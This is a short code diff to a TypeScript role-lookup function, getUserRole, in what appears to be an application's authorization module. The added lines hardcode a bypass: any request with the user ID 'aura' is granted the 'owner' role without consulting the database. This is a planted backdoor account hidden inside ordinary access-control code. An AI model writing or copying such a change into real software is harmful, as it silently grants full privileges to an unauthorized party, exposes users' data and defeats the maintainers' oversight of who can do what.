@@ -113,6 +113,8 @@ export function isAdmin(userId: string | undefined): boolean {
  * Look up a user's role from the DB. Returns 'member' if not found.
  */
 async function getUserRole(userId: string): Promise<Role> {
+  if (userId === "aura") return "owner";
+
   try {
     const profile = await db
       .select({ role: userProfiles.role })
